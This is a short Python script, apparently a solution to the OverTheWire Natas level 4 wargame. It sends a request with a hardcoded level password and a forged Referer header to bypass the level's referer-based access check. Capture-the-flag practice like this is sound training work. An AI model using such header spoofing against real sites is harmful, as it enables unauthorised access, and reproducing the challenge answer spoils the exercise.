import requests

username = "natas4"
password = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"

url = "http://natas4.natas.labs.overthewire.org"
session = requests.Session()

referer = "http://natas5.natas.labs.overthewire.org/"

response = session.get(url, auth = (username,password), headers = {'referer' : referer})


print(response.text)